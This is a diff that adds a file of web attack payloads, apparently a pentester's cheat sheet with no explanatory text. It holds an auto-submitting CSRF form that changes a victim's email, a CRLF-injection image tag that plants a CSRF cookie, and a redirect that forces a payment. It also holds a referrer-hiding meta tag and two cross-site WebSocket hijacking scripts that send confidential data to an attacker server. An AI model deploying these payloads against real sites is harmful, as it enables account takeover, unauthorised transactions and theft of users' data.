@@ -1,0 +1,34 @@
+<html> <body> <form action="https://vuln-site.com/email/change" method="GET">
+	<!-- <input type="hidden" name="_method" value="POST"> -->
+	<input type="hidden" name="email" value="pwn@evil.net" />
+</form> <script>document.forms[0].submit();</script> </body> </html>
+
+<img src="https://vuln.net/?s=t%0d%0aSet-Cookie:%20csrfKey=y492bqyaiZajhYw3r0jS8A7EyFoW8A3A%3b%20SameSite=None" onerror="document.forms[0].submit()">
+
+<script>document.location='https://vuln-site.gg/acc/pay?to=hacker&amount=69';</script>
+
+<meta name="referrer" content="never"> 
+
+
+<script>
+websocket = new WebSocket('wss://your-websocket-URL')
+websocket.onopen = start
+websocket.onmessage = handleReply
+function start(event) {
+	websocket.send("READY"); //Send the message to retrieve confidential information
+}
+	function handleReply(event) {
+	//Exfiltrate the confidential information to attackers server
+	fetch('https://xploit-server.net/?msg='+event.data, {mode: 'no-cors'}) // Look at get request header to figure msg out. Need url decoder
+}
+</script> 
+
+<script>
+ws = new WebSocket('wss://your-websocket-URL')
+ws.onopen = function (event) {
+	ws.send("READY"); 
+}
+ws.onmessage = function (event) {
+	fetch('https://xploit-server.net/?msg='+event.data, {mode: 'no-cors'});
+}
+</script> 
